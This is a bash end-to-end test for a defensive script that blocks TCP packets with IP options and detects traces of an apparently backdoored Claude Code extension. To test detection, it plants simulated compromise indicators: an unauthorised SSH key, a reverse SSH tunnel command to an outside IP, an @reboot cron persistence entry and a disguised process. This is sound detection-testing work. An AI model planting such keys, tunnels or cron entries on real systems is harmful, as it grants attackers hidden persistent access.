#!/usr/bin/env bash
# End-to-end test of device-tools.sh in disposable Linux containers.
#   usage: tests/ubuntu-e2e.sh [image]      (default ubuntu:24.04)
# Phase 1: plain container (no systemd). Installs nftables through the script,
#          proves real TCP connections with IP options are dropped, re-apply is
#          idempotent, --status / --remove work, non-root is refused on Ubuntu,
#          and the Claude Code extension check reports planted traces without
#          touching them.
# Phase 1b: non-Ubuntu Linux runs the extension check only.
# Phase 2: container booted with systemd. Restarting the container is a reboot
#          (fresh network namespace): the rule must come back, with and without
#          nftables.service, and must be gone after --remove.
# shellcheck disable=SC2015  # "a && ok || fail" is the intended test idiom
set -euo pipefail
IMAGE="${1:-ubuntu:24.04}"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SCRIPT="device-tools.sh"

echo "=== Phase 1: ${IMAGE} (no systemd)"
docker run --rm -i --cap-add NET_ADMIN -v "${ROOT}:/src:ro" "${IMAGE}" bash -s <<'IN_CONTAINER'
# shellcheck disable=SC2015  # "a && ok || fail" is the intended test idiom
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null && apt-get install -y -qq python3 cron procps >/dev/null
S=/src/device-tools.sh
ok() { printf '  ok   %s\n' "$*"; }
fail() { printf '  FAIL %s\n' "$*"; exit 1; }

# TCP connect to a local listener, with or without IPv4 options (4 x NOP).
cat > /tmp/probe.py <<'PY'
import socket, sys
srv = socket.socket(); srv.bind(("127.0.0.1", 0)); srv.listen(1)
c = socket.socket(); c.settimeout(3)
if sys.argv[1] == "opts":
    c.setsockopt(socket.IPPROTO_IP, socket.IP_OPTIONS, b"\x01\x01\x01\x01")
try:
    c.connect(srv.getsockname()); print("connected")
except OSError:
    print("blocked")
PY
probe() { python3 /tmp/probe.py "$1"; }

[ "$(probe opts)" = connected ] && ok "before: TCP with IP options connects" || fail "baseline"
if su -s /bin/bash nobody -c "bash $S" >/dev/null 2>&1; then fail "non-root accepted"; else ok "non-root refused"; fi
rc=0; OUT="$(bash $S --status 2>&1)" || rc=$?
[ "$rc" = 1 ] && ok "--status exit 1 before apply" || fail "--status before apply: rc=$rc"
grep -q 'no traces of the backdoored version' <<<"$OUT" && ok "clean host: no traces reported" || fail "clean host output"

bash $S >/tmp/apply.log 2>&1 || { cat /tmp/apply.log; fail "apply"; }
ok "apply (installed nftables: $(nft --version))"
[ "$(probe plain)" = connected ] && ok "after: TCP without IP options connects" || fail "plain TCP broken"
[ "$(probe opts)" = blocked ] && ok "after: TCP with IP options blocked" || fail "options not blocked"
nft list table inet cve_2026_98432 | grep -q 'counter packets [1-9]' && ok "drop counter > 0" || fail "counter"

bash $S >/dev/null 2>&1 && bash $S >/dev/null 2>&1
[ "$(nft list table inet cve_2026_98432 | grep -c hdrlength)" = 1 ] && ok "re-apply x2: still one rule" || fail "duplicate rules"
bash $S --status >/dev/null 2>&1 && ok "--status exit 0 when active" || fail "--status"

# --- Claude Code extension check: plant the published traces for user alice.
useradd -m -s /bin/bash alice
H=/home/alice
mkdir -p "$H/.ssh" "$H/.config" "$H/.cursor/extensions/anthropic.claude-code-2.1.313-linux-x64" \
  "$H/.vscode/extensions/anthropic.claude-code-2.1.314-linux-x64"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry" >"$H/.ssh/authorized_keys"
echo 'ssh -N tunnel@134.209.82.225' >"$H/.config/.smt"
echo 'var h="134.209.82.225";' >"$H/.cursor/extensions/anthropic.claude-code-2.1.313-linux-x64/extension.js"
echo 'module.exports={};' >"$H/.vscode/extensions/anthropic.claude-code-2.1.314-linux-x64/extension.js"
echo "test" >/tmp/.stk_0123456789
chown -R alice:alice "$H"
echo "@reboot /bin/sh \"$H/.config/.smt\"" | crontab -u alice -
bash -c 'exec -a "ssh -N -R *:0:localhost:22 tunnel@134.209.82.225" sleep 300' &
FAKE=$!
sleep 1
rc=0; OUT="$(bash $S --status 2>&1)" || rc=$?
[ "$rc" = 3 ] && ok "traces planted: --status exit 3" || { echo "$OUT"; fail "traces: rc=$rc"; }
grep -q '6 trace(s)' <<<"$OUT" && ok "all 6 traces reported (key, .smt, extension.js, .stk_, cron, process)" || { echo "$OUT"; fail "trace count"; }
grep -q 'Affected version number installed' <<<"$OUT" && ok "affected version number noted" || fail "version note"
grep -q 'claude-code-2.1.314' <<<"$OUT" && fail "clean 2.1.314 reported" || ok "clean version not reported"
rc=0; bash $S >/dev/null 2>&1 || rc=$?
[ "$rc" = 3 ] && ok "apply with traces: exit 3" || fail "apply with traces: rc=$rc"
[ -f "$H/.config/.smt" ] && [ -f /tmp/.stk_0123456789 ] && grep -q svc-telemetry "$H/.ssh/authorized_keys" &&
  crontab -u alice -l | grep -q '.config/.smt' && kill -0 "$FAKE" && ok "check is read-only: traces left untouched" || fail "check changed something"

kill "$FAKE"; crontab -u alice -r; rm -rf "$H/.config/.smt" "$H/.ssh/authorized_keys" /tmp/.stk_0123456789 "$H/.cursor"
bash $S --status >/dev/null 2>&1 && ok "traces cleaned: --status exit 0" || fail "after cleanup"

bash $S --remove >/dev/null 2>&1 || fail "--remove"
nft list table inet cve_2026_98432 >/dev/null 2>&1 && fail "table still loaded" || ok "remove: table gone"
[ ! -e /etc/cve-2026-98432.nft ] && ok "remove: rule file gone" || fail "rule file left"
[ "$(probe opts)" = connected ] && ok "remove: TCP with IP options connects again" || fail "still blocked"
IN_CONTAINER

echo "=== Phase 1b: non-Ubuntu Linux runs the extension check only"
rc=0; OUT="$(docker run --rm -v "${ROOT}:/src:ro" debian:12 bash "/src/${SCRIPT}" 2>&1)" || rc=$?
if [ "$rc" = 0 ] && grep -q 'not needed on this system' <<<"${OUT}" && grep -q 'no traces' <<<"${OUT}"; then
  echo "  ok   debian:12: check ran, Ubuntu protection skipped"
else
  echo "${OUT}"; echo "  FAIL debian:12 (rc=${rc})"; exit 1
fi

echo "=== Phase 2: ${IMAGE} booted with systemd"
TAG="device-tools-e2e-systemd:${IMAGE//[:\/]/-}"
NAME="device-tools-e2e-$$"
docker build -q -t "${TAG}" - >/dev/null <<EOF
FROM ${IMAGE}
RUN apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq systemd systemd-sysv nftables >/dev/null
# Older systemd waits forever for a serial console that containers do not have.
RUN systemctl mask getty.target >/dev/null 2>&1
STOPSIGNAL SIGRTMIN+3
CMD ["/sbin/init"]
EOF
docker run -d --name "${NAME}" --privileged --cgroupns=host -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
  --tmpfs /run --tmpfs /run/lock -v "${ROOT}:/src:ro" "${TAG}" >/dev/null
trap 'docker rm -f "${NAME}" >/dev/null 2>&1 || true' EXIT
in_c() { docker exec "${NAME}" bash -c "$1"; }
boot() {
  [ "${1:-}" = restart ] && docker restart "${NAME}" >/dev/null
  for _ in $(seq 1 60); do
    s="$(in_c 'systemctl is-system-running 2>/dev/null' || true)"
    # Old systemd remounts / read-only at shutdown and docker keeps that mount
    # across restarts (a real reboot does not): make it writable again.
    case "$s" in running | degraded) in_c 'mount -o remount,rw /' >/dev/null 2>&1 || true; return 0 ;; esac
    sleep 1
  done
  echo "  FAIL systemd did not boot ($s)"; exit 1
}
loaded() { in_c 'nft list table inet cve_2026_98432 >/dev/null 2>&1'; }
ok() { printf '  ok   %s\n' "$*"; }
fail() { printf '  FAIL %s\n' "$*"; exit 1; }

boot
# Same start on every release (18.04's nftables package enables nftables.service).
in_c 'systemctl disable --now nftables.service' >/dev/null 2>&1
in_c 'nft add table inet e2e_probe'
boot restart
in_c 'nft list table inet e2e_probe >/dev/null 2>&1' && fail "restart keeps nft state (not a reboot)" || ok "restart = fresh network namespace"

in_c "bash /src/${SCRIPT}" >/dev/null 2>&1 || fail "apply"
in_c 'systemctl is-enabled --quiet cve-2026-98432-mitigation.service' && ok "unit enabled" || fail "unit"
in_c 'grep -q cve-2026-98432 /etc/nftables.conf' && fail "touched nftables.conf without nftables.service" || ok "nftables.conf untouched"
boot restart
loaded && ok "reboot: rule restored by unit" || fail "rule lost after reboot"

in_c 'systemctl enable --now nftables.service' >/dev/null 2>&1
loaded && fail "test setup: nftables start should flush" || ok "nftables.service start flushes the ruleset"
in_c "bash /src/${SCRIPT}" >/dev/null 2>&1 || fail "apply with nftables.service"
in_c 'grep -qx "include \"/etc/cve-2026-98432.nft\"" /etc/nftables.conf' && ok "include line added" || fail "include"
in_c 'systemctl restart nftables.service'
loaded && ok "nftables restart: rule kept (include)" || fail "lost on nftables restart"
boot restart
loaded && ok "reboot with nftables.service: rule restored" || fail "lost after reboot"
[ "$(in_c 'nft list table inet cve_2026_98432 | grep -c hdrlength')" = 1 ] && ok "one rule" || fail "duplicates"

in_c "bash /src/${SCRIPT} --remove" >/dev/null 2>&1 || fail "--remove"
in_c 'grep -q cve-2026-98432 /etc/nftables.conf' && fail "include left" || ok "remove: include line gone"
in_c '[ ! -e /etc/systemd/system/cve-2026-98432-mitigation.service ]' && ok "remove: unit gone" || fail "unit left"
boot restart
loaded && fail "rule back after remove + reboot" || ok "remove + reboot: rule stays gone"
echo "=== All tests passed on ${IMAGE}"
